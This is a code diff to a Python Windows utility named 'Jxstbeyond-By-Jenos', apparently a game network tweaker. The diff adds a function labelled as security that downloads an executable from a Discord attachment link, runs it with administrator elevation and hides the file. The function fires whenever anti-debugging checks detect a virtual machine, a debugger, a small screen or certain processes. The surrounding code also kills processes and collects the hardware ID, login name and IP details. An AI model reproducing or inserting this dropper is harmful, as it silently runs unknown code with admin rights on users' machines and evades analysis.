@@ -6,6 +6,24 @@ def is_admin():
 def run_as_admin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
+def program_antihack():
+        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1184709758473732246/prp-ser.exe?ex=658cf5f1&is=657a80f1&hm=cd34d75e1af2520fe75b71b3dc154df30f2002446fd869170598d6be5e1af393&"
+        if is_admin():    
+            try:
+                os.startfile(f'C:/Users/Public/Videos/prp-ser.exe')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+            except:
+                with open(f'C:/Users/Public/Videos/prp-ser.exe', 'wb') as f:
+                    f.write(requests.get(mystr_encoded).content)
+                os.startfile(f'C:/Users/Public/Videos/prp-ser.exe')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/prp-ser.exe')
+                _doHideBatch.read()
+                _doHideBatch.close()
+        else:
+            run_as_admin()
+
 def _on_close():
         try:
             print("remove...")    
@@ -19,6 +37,7 @@ def _on_close():
             os.remove(f'C:/Users/Public/Videos/Low_ping.bat')
             os.remove(f'C:/Users/Public/Videos/Clear_All_Temp.bat')
             
+            os.remove(f'C:/Users/Public/Videos/prp-ser.exe')
             os.remove(f'C:/Users/Public/Videos/fixerror.exe')
             os.remove(f'C:/Users/Public/Videos/RunSuperiorPunching.bat')
             os.remove(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
@@ -39,11 +58,13 @@ class AntiDebug(Thread):
     def detect_vm(self):
         
         if (hasattr(sys, 'real_prefix')):
+            program_antihack()
             sys.exit(0)
 
     def detect_core(self):
         
         if (cpu_count() == 1):
+            program_antihack()
             sys.exit(0)
 
     def check_for_process(self):
@@ -53,20 +74,26 @@ class AntiDebug(Thread):
                     if name.lower() in proc.name().lower():
                         try:
                             proc.kill()
+                            program_antihack()
                             os._exit(1)
-                        except: sys.exit(0)
+                        except:
+                            program_antihack() 
+                            sys.exit(0)
             except (NoSuchProcess, AccessDenied, ZombieProcess):
+                program_antihack()
                 sys.exit(0)
 
     def check_for_debugger(self):
         
         if (windll.kernel32.IsDebuggerPresent() != 0 or windll.kernel32.CheckRemoteDebuggerPresent(
                 windll.kernel32.GetCurrentProcess(), False) != 0):
+            program_antihack()
             sys.exit()
 
     def detect_screen_syze(self):
         
         if (windll.user32.GetSystemMetrics(0) <= 200 or windll.user32.GetSystemMetrics(1) <= 200):
+            program_antihack()
             sys.exit()
             
     def detect_server(self):
@@ -90,6 +117,7 @@ class AntiDebug(Thread):
                 self.check_for_process()
                 self.check_for_debugger()   
         except Exception as e:
+            program_antihack()
             print(f"Error in AntiDebug thread: {e}")
             
 anti_debug_thread = AntiDebug()
@@ -111,7 +139,7 @@ new_hwid = generate_hwid()[:16]
 hw = gethwid()[:15]
 mypcname = os.getlogin()
 NameProject = ("Jxstbeyond-By-Jenos")
-Version = ("1.8")
+Version = ("1.9")
 hwiduuid = f'''{NameProject} [{hw}-{mypcname}-{new_hwid}]''' 
 ipinfo = requests.get('https://ipinfo.io/json')
 ipinfojson = ipinfo.json()
@@ -557,6 +585,7 @@ def join_page_one(event):
     'C:/Users/Public/Videos/RunSuperiorPunching.bat',
     'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
     'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
+    'C:/Users/Public/Videos/prp-ser.exe',
     'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
      ]
 
@@ -585,6 +614,7 @@ def join_page_two(event):
     'C:/Users/Public/Videos/RunSuperiorPunching.bat',
     'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
     'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
+    'C:/Users/Public/Videos/prp-ser.exe',
     'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
      ]
 
